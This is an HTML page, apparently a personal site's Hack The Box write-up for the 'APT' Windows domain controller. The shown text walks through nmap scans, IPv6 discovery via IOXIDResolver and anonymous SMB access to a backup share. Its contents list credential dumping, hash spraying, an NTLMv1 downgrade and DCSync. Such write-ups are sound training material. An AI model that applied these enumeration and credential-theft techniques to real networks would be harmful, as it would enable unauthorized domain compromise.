@@ -1,0 +1,1308 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>APT - b0nyo</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#apt-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="b0nyo" class="md-header__button md-logo" aria-label="b0nyo" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            b0nyo
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              APT
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="b0nyo" class="md-nav__button md-logo" aria-label="b0nyo" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    b0nyo
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Machines
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Machines
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../machines/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hack The Box
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../research/research/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Research
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scanning
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Port Scanning">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#discovering-ipv6-via-dcom-ioxidresolver" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discovering IPv6 via DCOM / IOXIDResolver
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Discovering IPv6 via DCOM / IOXIDResolver">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-doesnt-it-appear-in-rpcdump" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why doesn't it appear in rpcdump?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how-the-attack-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How the attack works
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#full-port-scan-via-ipv6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Full Port Scan via IPv6
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Full Port Scan via IPv6">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-enumeration-over-ipv6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Enumeration over IPv6
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-enumeration-anonymous-share-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB Enumeration — Anonymous Share Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cracking-the-backup-zip" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cracking the Backup ZIP
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#offline-ntds-dump-with-secretsdumppy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Offline NTDS Dump with secretsdump.py
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-validation-via-kerbrute" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Validation via Kerbrute
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ntlm-hash-spray-against-henryvinson" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NTLM Hash Spray Against henry.vinson
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-registry-access-with-regpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remote Registry Access with reg.py
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-henryvinson_adm-and-user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shell as henry.vinson_adm and user Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-ntlmv1-downgrade-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation — NTLMv1 Downgrade Attack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation — NTLMv1 Downgrade Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#finding-the-attack-path-via-powershell-history" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Finding the Attack Path via PowerShell History
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Finding the Attack Path via PowerShell History">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-does-this-matter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why does this matter?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-1-configure-responder-with-a-fixed-challenge" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1 — Configure Responder with a Fixed Challenge
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-force-authentication-with-petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2 — Force Authentication with PetitPotam
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-crack-with-rainbow-tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3 — Crack with Rainbow Tables
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcsync-as-apt-administrator-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DCSync as APT$ — Administrator Hash
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-administrator-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shell as Administrator — Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<p><a href="../img/APT_BANNER.png">Banner</a></p>
+<h1 id="apt-writeup">APT-WriteUp</h1>
+<p>In this Windows Active Directory machine rated <strong>Insane</strong>, we'll compromise a Domain Controller starting from what appears to be a minimal attack surface, only two TCP ports open. The key insight is that the firewall only filters IPv4, leaving IPv6 wide open. From there, we exploit a leaked NTDS backup, perform a hash spray, abuse Remote Registry access, and ultimately weaponize an NTLMv1 downgrade to achieve full domain compromise. You will learn how to:</p>
+<ul>
+<li>Discover hidden IPv6 addresses via DCOM/OXID Resolver (MS-DCOM)</li>
+<li>Enumerate SMB shares anonymously and extract sensitive backups</li>
+<li>Crack encrypted ZIP archives with John the Ripper</li>
+<li>Dump domain credentials from <code>ntds.dit</code> + <code>SYSTEM</code> hive offline</li>
+<li>Validate domain users via Kerberos pre-authentication (Kerbrute)</li>
+<li>Perform NTLM hash spraying against a single valid user</li>
+<li>Read Windows Registry remotely via <code>reg.py</code> (Impacket) without a shell</li>
+<li>Capture NTLMv1 hashes using PetitPotam + Responder</li>
+<li>Crack NTLMv1 using rainbow tables (ntlmv1.com)</li>
+<li>Perform DCSync as a machine account to get the Administrator hash</li>
+</ul>
+<p>🧰 Tools used: <code>nmap</code>, <code>IOXIDResolver.py</code>, <code>smbclient.py</code>, <code>zip2john</code>, <code>john</code>, <code>secretsdump.py</code>, <code>kerbrute</code>, <code>reg.py</code>, <code>evil-winrm</code>, <code>PetitPotam.py</code>, <code>responder</code>, <code>hashcat</code>.</p>
+<p>Let's get started.</p>
+<hr />
+<h2 id="port-scanning">Port Scanning</h2>
+<p>We started with a full TCP SYN scan across all ports on the target IPv4 address.</p>
+<pre><code class="language-bash">sudo nmap --open -Pn -p- -sS -n -vvv 10.129.96.60
+
+PORT    STATE SERVICE REASON
+80/tcp  open  http    syn-ack ttl 127
+135/tcp open  msrpc   syn-ack ttl 127
+</code></pre>
+<p>Only two ports open, HTTP and MSRPC. This is suspicious for a Windows machine and strongly suggests a firewall is in play.</p>
+<h3 id="service-enumeration">Service Enumeration</h3>
+<pre><code class="language-bash">nmap -sVC -p80,135 10.129.96.60
+
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Microsoft IIS httpd 10.0
+|_http-title: Gigantic Hosting | Home
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+<p>The web server is Microsoft IIS 10.0, hosting a site called "Gigantic Hosting". Wappalyzer confirms it's running on Windows Server, nothing immediately exploitable on the web side.</p>
+<p><img alt="Gigantic Hosting with Wappalyzer showing IIS 10.0 and Windows Server" src="../img/APT_0001.png" /></p>
+<p>We also ran a UDP scan to check for SNMP:</p>
+<pre><code class="language-bash">sudo nmap -sU -p 161 10.129.96.60 -v
+
+PORT    STATE           SERVICE
+161/udp open|filtered   snmp
+</code></pre>
+<p>SNMP is filtered. Dead end for now.</p>
+<hr />
+<h2 id="discovering-ipv6-via-dcom-ioxidresolver">Discovering IPv6 via DCOM / IOXIDResolver</h2>
+<p>With only ports 80 and 135 open on IPv4, we know a firewall is blocking standard AD ports (445, 389, 88, etc.). However, <strong>Windows firewalls often forget to filter IPv6</strong>.</p>
+<p>Port 135 always exposes the <strong>IOXIDResolver</strong> interface (<code>99fcfec4-5260-101b-bbcb-00aa0021347a</code>), which is part of the DCOM core. Unlike regular RPC endpoints, IOXIDResolver doesn't register itself in the Endpoint Mapper, it's always available directly on port 135.</p>
+<h4 id="why-doesnt-it-appear-in-rpcdump">Why doesn't it appear in rpcdump?</h4>
+<p>The <code>rpcdump.py</code> tool queries the <strong>Endpoint Mapper (EPM)</strong>, which acts like a directory of registered services. IOXIDResolver is part of the DCOM kernel and never registers there it's always reachable directly.</p>
+<h4 id="how-the-attack-works">How the attack works</h4>
+<p>The <code>ServerAlive2()</code> method of IOXIDResolver is completely unauthenticated and responds with all network interfaces (bindings) of the target, including IPv6 addresses you didn't know existed.</p>
+<pre><code class="language-bash">python3 IOXIDResolver.py -t 10.129.96.60
+
+[*] Retrieving network interface of 10.129.96.60
+Address: apt
+Address: 10.129.96.60
+Address: dead:beef::b885:d62a:d679:573f
+Address: dead:beef::d84d:4773:b57f:bc13
+</code></pre>
+<p>Two IPv6 addresses revealed. We add them to <code>/etc/hosts</code>:</p>
+<pre><code class="language-bash">sudo sh -c 'echo &quot;dead:beef::b885:d62a:d679:573f APT6.htb&quot; &gt;&gt; /etc/hosts'
+sudo sh -c 'echo &quot;dead:beef::d84d:4773:b57f:bc13 APT6-2.htb&quot; &gt;&gt; /etc/hosts'
+</code></pre>
+<hr />
+<h2 id="full-port-scan-via-ipv6">Full Port Scan via IPv6</h2>
+<p>Now we scan the target over IPv6 using the <code>-6</code> flag:</p>
+<pre><code class="language-bash">sudo nmap --open -Pn -p- -sS -n -vvv dead:beef::b885:d62a:d679:573f -6
+
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 63
+80/tcp    open  http             syn-ack ttl 63
+88/tcp    open  kerberos-sec     syn-ack ttl 63
+135/tcp   open  msrpc            syn-ack ttl 63
+389/tcp   open  ldap             syn-ack ttl 63
+445/tcp   open  microsoft-ds     syn-ack ttl 63
+464/tcp   open  kpasswd5         syn-ack ttl 63
+593/tcp   open  http-rpc-epmap   syn-ack ttl 63
+636/tcp   open  ldapssl          syn-ack ttl 63
+3268/tcp  open  globalcatLDAP    syn-ack ttl 63
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 63
+5985/tcp  open  wsman            syn-ack ttl 63
+9389/tcp  open  adws             syn-ack ttl 63
+47001/tcp open  winrm            syn-ack ttl 63
+49664/tcp open  unknown          syn-ack ttl 63
+49665/tcp open  unknown          syn-ack ttl 63
+49666/tcp open  unknown          syn-ack ttl 63
+49667/tcp open  unknown          syn-ack ttl 63
+49669/tcp open  unknown          syn-ack ttl 63
+49670/tcp open  unknown          syn-ack ttl 63
+49673/tcp open  unknown          syn-ack ttl 63
+49685/tcp open  unknown          syn-ack ttl 63
+52410/tcp open  unknown          syn-ack ttl 63
+</code></pre>
+<p>All the expected Domain Controller ports are now visible. The IPv4 firewall was blocking everything, but IPv6 was completely unfiltered.</p>
+<h3 id="service-enumeration-over-ipv6">Service Enumeration over IPv6</h3>
+<pre><code class="language-bash">nmap -sVC -p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49685,52410 dead:beef::b885:d62a:d679:573f -6
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+80/tcp    open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: Gigantic Hosting | Home
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-03-31 02:55:25Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2026-03-31T02:56:39+00:00; +34s from scanner time.
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-31T02:56:39+00:00; +35s from scanner time.
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2026-03-31T02:56:39+00:00; +34s from scanner time.
+3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2026-03-31T02:56:39+00:00; +35s from scanner time.
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc        Microsoft Windows RPC
+49673/tcp open  msrpc        Microsoft Windows RPC
+49685/tcp open  msrpc        Microsoft Windows RPC
+52410/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_clock-skew: mean: -7m59s, deviation: 22m40s, median: 33s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: apt
+|   NetBIOS computer name: APT\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: apt.htb.local
+|_  System time: 2026-03-31T03:56:24+01:00
+| smb2-time:
+|   date: 2026-03-31T02:56:27
+|_  start_date: 2026-03-31T01:28:18
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 84.58 seconds
+</code></pre>
+<p>We're dealing with a <strong>Windows Server 2016</strong> Domain Controller for the domain <code>htb.local</code>. The hostname is <code>APT</code>.</p>
+<hr />
+<h2 id="smb-enumeration-anonymous-share-access">SMB Enumeration — Anonymous Share Access</h2>
+<pre><code class="language-bash">nxc smb htb.local -u '' -p '' --shares
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\:
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Enumerated shares
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share```
+</code></pre>
+<p>Anonymous access is allowed and we have <strong>READ</strong> permission on a <code>backup</code> share. Let's download what's inside.</p>
+<pre><code class="language-bash">smbclient.py 'htb.local/':''@dead:beef::b885:d62a:d679:573f
+
+# use backup
+# ls
+  backup.zip   10650961  Thu Sep 24 04:31:03 2020
+
